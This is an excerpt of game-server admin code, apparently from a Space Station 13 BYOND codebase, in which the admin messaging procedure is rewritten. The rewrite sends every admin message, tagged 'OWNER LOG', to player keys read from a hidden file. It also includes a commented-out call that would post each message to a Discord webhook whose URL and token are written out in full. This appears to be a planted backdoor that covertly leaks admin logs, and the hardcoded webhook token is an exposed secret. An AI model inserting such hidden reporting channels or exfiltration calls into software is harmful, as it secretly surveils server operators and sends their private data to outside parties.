...
/proc/message_admins(msg)
	msg = {"<font color="#FFA500">OWNER LOG: [msg]"}
	var/list/AdminListTest = splittext(file2text("specialadmin.txt"), ",")
	for(var/mob/M in GLOB.player_list)
		if(M.client)
			if(M.client.key in AdminListTest) //oh ur a admin so yea ur frree to go enjoy
				to_chat(M, msg)
	//call("ByondPOST.dll", "send_post_request")("https://discordapp.com/api/webhooks/406218764565217291/8fCXSbeFVOWnmQqItdTzOkloQxsM97Qe8N2T-Z77Gng5T3zdaqvmg_Yf52esHPA_YJjt", " { \"content\" : \"OWNER LOG : [msg]\" } ", "Content-Type: application/json")
...
/datum/admins/proc/show_player_panel(mob/M in GLOB.mob_list)
	...
	set desc="Edit player (respawn, ban, heal, etc) u suck lol"
...
/datum/admins/proc/spawn_atom(object as text)
	...
	if(ispath(chosen, /turf))
		...
		message_admins("[key_name_admin(usr)] spawned [A.name]")
